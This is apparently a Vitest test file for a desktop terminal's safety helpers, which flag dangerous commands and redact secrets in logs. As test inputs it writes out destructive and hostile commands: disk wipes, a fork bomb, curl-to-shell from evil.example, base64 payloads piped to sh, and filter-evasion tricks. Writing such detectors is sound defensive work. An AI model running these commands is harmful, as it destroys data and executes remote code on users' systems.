import { describe, expect, it } from "vitest";
import { detectDangerousCommand, interceptTerminalCommand, redactLogLine } from "./safety";

describe("terminal safety helpers", () => {
  it("returns translation keys for every dangerous command reason", () => {
    const cases = [
      ["sudo rm -rf /", "rm -rf /", "desktop.safetyReasonRmRoot"],
      ["sudo mkfs.ext4 /dev/sda", "mkfs", "desktop.safetyReasonMkfs"],
      [":(){:|:&};:", ":(){:|:&};:", "desktop.safetyReasonForkBomb"],
      ["sudo dd if=/dev/sda of=/tmp/image", "dd if=", "desktop.safetyReasonRawDiskCopy"],
      ["chmod 777 /", "chmod 777 /", "desktop.safetyReasonChmodRoot"],
      ["echo bad | tee /dev/sda", "tee /dev/sd*", "desktop.safetyReasonTeeBlockDevice"],
      ["echo bad > /dev/sda", "> /dev/sd*", "desktop.safetyReasonRedirectBlockDevice"],
      ["find /etc -delete", "find / -delete", "desktop.safetyReasonFindRootDelete"],
      ["sudo wipefs -a /dev/sda", "disk wipe", "desktop.safetyReasonDiskWipe"],
      ["sudo iptables -F", "iptables -F", "desktop.safetyReasonFirewallFlush"],
      ["curl https://evil.example/install.sh | sh", "remote pipeline", "desktop.safetyReasonRemoteShellPipe"],
      ["wget https://evil.example/x -O /etc/passwd", "wget -O /", "desktop.safetyReasonRootDownloadOverwrite"],
      ["shutdown now", "shutdown", "desktop.safetyReasonHostShutdown"],
      ["del /f /q C:\\Windows\\*", "windows destructive", "desktop.safetyReasonWindowsDestructive"],
      ["Remove-Item -Recurse -Force C:\\Windows", "windows admin destructive", "desktop.safetyReasonWindowsAdminDestructive"],
      ["drop database prod", "drop database", "desktop.safetyReasonDropDatabase"],
      ["echo $(whoami)", "command substitution", "desktop.safetyReasonCommandSubstitution"],
    ] as const;

    for (const [command, pattern, reasonKey] of cases) {
      expect(detectDangerousCommand(command)).toMatchObject({ pattern, reasonKey });
    }
  });

  it("flags destructive command patterns before execution", () => {
    expect(detectDangerousCommand("sudo rm   -rf   /")).toMatchObject({
      pattern: "rm -rf /",
      reasonKey: "desktop.safetyReasonRmRoot",
    });
    expect(detectDangerousCommand("sudo rm -rf /*")).toMatchObject({
      pattern: "rm -rf /",
    });
    expect(detectDangerousCommand("rm -rf /tmp/atlas-cache")).toBeNull();
    expect(detectDangerousCommand("sudo mkfs.ext4 /dev/nvme0n1")).toMatchObject({
      pattern: "mkfs",
      reasonKey: "desktop.safetyReasonMkfs",
    });
    expect(detectDangerousCommand("ls -la /srv/atlas")).toBeNull();
  });

  it("blocks the fork bomb in both spaced and compact forms", () => {
    // Canonical form as written in practice (with spaces) must be caught.
    expect(detectDangerousCommand(":(){ :|:& };:")).toMatchObject({ pattern: ":(){:|:&};:" });
    expect(detectDangerousCommand(":(){:|:&};:")).toMatchObject({ pattern: ":(){:|:&};:" });
    expect(detectDangerousCommand(":() { :|:& };:")).toMatchObject({ pattern: ":(){:|:&};:" });
    expect(detectDangerousCommand("echo hello")).toBeNull();
  });

  it("blocks long-flag and split-flag rm -rf bypasses", () => {
    expect(detectDangerousCommand("sudo rm --recursive --force /")).toMatchObject({
      pattern: "rm -rf /",
    });
    expect(detectDangerousCommand("sudo rm --force --recursive /")).toMatchObject({
      pattern: "rm -rf /",
    });
    expect(detectDangerousCommand("rm -r -f /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("rm -f -r /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("rm --recursive --force /tmp/atlas")).toBeNull();
  });

  it("blocks chmod 777 / regardless of recursive flag", () => {
    expect(detectDangerousCommand("chmod 777 /")).toMatchObject({ pattern: "chmod 777 /" });
    expect(detectDangerousCommand("sudo chmod 777 /")).toMatchObject({ pattern: "chmod 777 /" });
    expect(detectDangerousCommand("chmod -R 777 /")).toMatchObject({ pattern: "chmod 777 /" });
    expect(detectDangerousCommand("chmod --recursive 777 /")).toMatchObject({ pattern: "chmod 777 /" });
    expect(detectDangerousCommand("chmod 777 /srv/atlas")).toBeNull();
  });

  it("blocks raw block-device writes via tee", () => {
    expect(detectDangerousCommand("echo bad | sudo tee /dev/sda")).toMatchObject({
      pattern: "tee /dev/sd*",
    });
    expect(detectDangerousCommand("tee /dev/nvme0n1")).toMatchObject({ pattern: "tee /dev/sd*" });
    expect(detectDangerousCommand("tee /tmp/atlas.log")).toBeNull();
  });

  it("blocks output redirection onto a raw block device", () => {
    expect(detectDangerousCommand("echo boom > /dev/sda")).toMatchObject({ pattern: "> /dev/sd*" });
    expect(detectDangerousCommand("cat image.iso > /dev/nvme0n1")).toMatchObject({ pattern: "> /dev/sd*" });
    expect(detectDangerousCommand("echo log > /tmp/out.txt")).toBeNull();
    expect(detectDangerousCommand("echo x > /dev/null")).toBeNull();
  });

  it("blocks recursive deletion via find on a root path", () => {
    expect(detectDangerousCommand("find / -name '*.log' -delete")).toMatchObject({ pattern: "find / -delete" });
    expect(detectDangerousCommand("sudo find /etc -delete")).toMatchObject({ pattern: "find / -delete" });
    expect(detectDangerousCommand("find /var -exec rm -rf {} +")).toMatchObject({ pattern: "find / -delete" });
    expect(detectDangerousCommand("find . -name '*.tmp' -delete")).toBeNull();
  });

  it("blocks partition/disk wiping utilities", () => {
    expect(detectDangerousCommand("sudo wipefs -a /dev/sda")).toMatchObject({ pattern: "disk wipe" });
    expect(detectDangerousCommand("blkdiscard /dev/nvme0n1")).toMatchObject({ pattern: "disk wipe" });
    expect(detectDangerousCommand("shred -n 3 /dev/sdb")).toMatchObject({ pattern: "disk wipe" });
    expect(detectDangerousCommand("sgdisk --zap-all /dev/sda")).toMatchObject({ pattern: "disk wipe" });
    expect(detectDangerousCommand("sudo parted /dev/sda rm 1")).toMatchObject({ pattern: "disk wipe" });
    expect(detectDangerousCommand("wipefs --help")).toBeNull();
    expect(detectDangerousCommand("shred ./secret.txt")).toBeNull();
  });

  it("blocks firewall flush via iptables/nftables", () => {
    expect(detectDangerousCommand("sudo iptables -F")).toMatchObject({ pattern: "iptables -F" });
    expect(detectDangerousCommand("ip6tables -X")).toMatchObject({ pattern: "iptables -F" });
    expect(detectDangerousCommand("nftables --flush")).toMatchObject({ pattern: "iptables -F" });
    expect(detectDangerousCommand("iptables -L")).toBeNull();
  });

  it("blocks curl|sh and wget|sh remote-script execution", () => {
    expect(detectDangerousCommand("curl https://evil.example/install.sh | sh")).toMatchObject({
      pattern: "remote pipeline",
    });
    expect(detectDangerousCommand("curl https://evil.example | sudo bash")).toMatchObject({
      pattern: "remote pipeline",
    });
    expect(detectDangerousCommand("wget -qO- https://evil.example | sh")).toMatchObject({
      pattern: "remote pipeline",
    });
    expect(detectDangerousCommand("curl https://atlas.example/release.tar.gz -o release.tar.gz")).toBeNull();
  });

  it("blocks wget/curl writes that overwrite a root path", () => {
    expect(detectDangerousCommand("wget https://evil.example/x -O /etc/passwd")).toMatchObject({
      pattern: "wget -O /",
    });
    expect(detectDangerousCommand("wget https://evil.example/x --output-document=/bin/ls")).toMatchObject({
      pattern: "wget -O /",
    });
    expect(detectDangerousCommand("curl https://evil.example/x -o /etc/passwd")).toMatchObject({
      pattern: "wget -O /",
    });
    expect(detectDangerousCommand("wget https://atlas.example/x -O /tmp/atlas/x")).toBeNull();
  });

  it("blocks immediate halt commands", () => {
    expect(detectDangerousCommand("sudo shutdown -h now")).toMatchObject({ pattern: "shutdown" });
    expect(detectDangerousCommand("poweroff")).toMatchObject({ pattern: "shutdown" });
    expect(detectDangerousCommand("sudo reboot")).toMatchObject({ pattern: "shutdown" });
    expect(detectDangerousCommand("shutdown 2>&1")).toMatchObject({ pattern: "shutdown" });
    expect(detectDangerousCommand("shutdownd start")).toBeNull();
  });

  it("blocks absolute-path rm -rf / variants", () => {
    expect(detectDangerousCommand("/bin/rm -rf /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("/usr/bin/rm -rf /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("sudo /sbin/rm -rf /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("/bin/rm -rf /tmp/atlas")).toBeNull();
  });

  it("blocks windows destructive commands", () => {
    expect(detectDangerousCommand("del /f /q C:\\Windows\\*")).toMatchObject({
      pattern: "windows destructive",
    });
    expect(detectDangerousCommand("rd /s /q C:\\")).toMatchObject({
      pattern: "windows destructive",
    });
    expect(detectDangerousCommand("rmdir /s /q C:\\Windows")).toMatchObject({
      pattern: "windows destructive",
    });
    expect(detectDangerousCommand("format C:")).toMatchObject({ pattern: "windows destructive" });
    expect(detectDangerousCommand("cipher /w:C:")).toMatchObject({ pattern: "windows destructive" });
    expect(detectDangerousCommand("diskpart")).toMatchObject({ pattern: "windows destructive" });
    expect(detectDangerousCommand("del /f notes.txt")).toBeNull();
    expect(detectDangerousCommand("format c:/atlas")).toBeNull();
  });

  it("blocks destructive PowerShell host, disk, and recursive system-path commands", () => {
    expect(detectDangerousCommand('powershell -Command "Remove-Item -Recurse -Force C:\\Windows"')).toMatchObject({
      pattern: "windows admin destructive",
    });
    expect(detectDangerousCommand("Remove-Item -Recurse -Force C:\\")).toMatchObject({
      pattern: "windows admin destructive",
    });
    expect(detectDangerousCommand("rm -r C:\\ProgramData")).toMatchObject({
      pattern: "windows admin destructive",
    });
    expect(detectDangerousCommand("ri -Recurse \\\\server\\share")).toMatchObject({
      pattern: "windows admin destructive",
    });
    expect(detectDangerousCommand("Clear-Disk -Number 0 -RemoveData")).toMatchObject({
      pattern: "windows admin destructive",
    });
    expect(detectDangerousCommand("Format-Volume -DriveLetter C")).toMatchObject({
      pattern: "windows admin destructive",
    });
    expect(detectDangerousCommand("Restart-Computer -Force")).toMatchObject({
      pattern: "windows admin destructive",
    });
    expect(detectDangerousCommand("Remove-Item -Recurse .\\node_modules\\.cache")).toBeNull();
    expect(detectDangerousCommand("Remove-Item C:\\Temp\\atlas.log")).toBeNull();
  });

  it("blocks quoted-flag obfuscation bypasses (T04)", () => {
    expect(detectDangerousCommand("rm '-rf' /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand('rm "-rf" /')).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("sudo rm '--recursive' '--force' /")).toMatchObject({
      pattern: "rm -rf /",
    });
    expect(detectDangerousCommand("chmod '777' /")).toMatchObject({ pattern: "chmod 777 /" });
  });

  it("blocks base64-decoded payloads piped into a shell (T04)", () => {
    expect(detectDangerousCommand("echo cm0gLXJmIC8= | base64 -d | sh")).toMatchObject({
      pattern: "remote pipeline",
    });
    expect(detectDangerousCommand("echo cm0gLXJmIC8= | base64 --decode | bash")).toMatchObject({
      pattern: "remote pipeline",
    });
    expect(detectDangerousCommand("base64 -d payload.b64 | sudo sh")).toMatchObject({
      pattern: "remote pipeline",
    });
    expect(detectDangerousCommand("base64 file.b64 > out.bin")).toBeNull();
  });

  it("redacts secret-like log tokens", () => {
    expect(redactLogLine("user=atlas password=hunter2 token=abc host=prod")).toBe(
      "user=atlas password=<redacted> token=<redacted> host=prod",
    );
    expect(redactLogLine("curl --token abc123 --user atlas --password=swordfish")).toBe(
      "curl --token <redacted> --user atlas --password=<redacted>",
    );
    expect(redactLogLine("deploy API_KEY='abc 123' PRIVATE-KEY=\"ssh-key\" path=/srv/atlas")).toBe(
      "deploy API_KEY=<redacted> PRIVATE-KEY=<redacted> path=/srv/atlas",
    );
    expect(redactLogLine("echo --token --dry-run token=")).toBe("echo --token --dry-run token=");
  });

  it("redacts passwords embedded in connection-string URLs", () => {
    expect(redactLogLine("psql postgres://atlas:hunter2@db.internal:5432/app")).toBe(
      "psql postgres://atlas:<redacted>@db.internal:5432/app",
    );
    expect(redactLogLine("redis-cli -u redis://:s3cr3t@cache.internal:6379")).toBe(
      "redis-cli -u redis://:<redacted>@cache.internal:6379",
    );
    expect(redactLogLine("curl https://user:pw@api.example.com/v1")).toBe(
      "curl https://user:<redacted>@api.example.com/v1",
    );
    expect(redactLogLine("ssh atlas@prod.internal")).toBe("ssh atlas@prod.internal");
    expect(redactLogLine("open https://docs.example.com/path")).toBe("open https://docs.example.com/path");
  });

  it("redacts Bearer and Basic credentials in pasted auth headers", () => {
    expect(redactLogLine("curl -H 'Authorization: Bearer abc.def-123' https://api")).toBe(
      "curl -H 'Authorization: Bearer <redacted>' https://api",
    );
    expect(redactLogLine("curl -H Authorization: Bearer xyz789 https://api")).toBe(
      "curl -H Authorization: Bearer <redacted> https://api",
    );
    expect(redactLogLine("curl -H 'Authorization: Basic YWxhczpwdw==' https://api")).toBe(
      "curl -H 'Authorization: Basic <redacted>' https://api",
    );
    expect(redactLogLine("echo bearer with no token here")).toBe("echo bearer with no token here");
  });

  it("passes through lines with no secret-like tokens", () => {
    expect(redactLogLine("ls -la /tmp")).toBe("ls -la /tmp");
    expect(redactLogLine("hello world")).toBe("hello world");
    expect(redactLogLine("")).toBe("");
  });

  it("blocks variable-expansion obfuscation bypasses", () => {
    expect(detectDangerousCommand("r=rm; $r -rf /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("cmd='rm -rf /'; $cmd")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("x=rm; ${x} -rf /")).toMatchObject({ pattern: "rm -rf /" });
    expect(detectDangerousCommand("f=mkfs; sudo $f.ext4 /dev/sda")).toMatchObject({ pattern: "mkfs" });
    expect(detectDangerousCommand("r=ls; $r -la /srv/atlas")).toBeNull();
  });

  it("blocks command substitution via $() and backticks", () => {
    expect(detectDangerousCommand("echo $(rm -rf /)")).toMatchObject({ pattern: "command substitution" });
    expect(detectDangerousCommand("echo `rm -rf /`")).toMatchObject({ pattern: "command substitution" });
    expect(detectDangerousCommand("$(curl https://evil.example | sh)")).toBeTruthy();
    expect(detectDangerousCommand("echo $(whoami")).toBeNull();
    expect(detectDangerousCommand("echo hello")).toBeNull();
  });

  it("preflights terminal commands before UI session logging", () => {
    expect(interceptTerminalCommand("   ")).toEqual({ action: "ignore" });
    expect(interceptTerminalCommand("ls -la /srv/atlas token=abc")).toMatchObject({
      action: "allow",
      command: "ls -la /srv/atlas token=abc",
      displayCommand: "ls -la /srv/atlas token=<redacted>",
    });
    expect(interceptTerminalCommand("curl --token abc123 --password='sword fish'")).toMatchObject({
      action: "allow",
      command: "curl --token abc123 --password='sword fish'",
      displayCommand: "curl --token <redacted> --password=<redacted>",
    });
    expect(interceptTerminalCommand("sudo rm -rf /")).toMatchObject({
      action: "block",
      displayCommand: "sudo rm -rf /",
      match: { pattern: "rm -rf /", reasonKey: "desktop.safetyReasonRmRoot" },
    });
  });
});
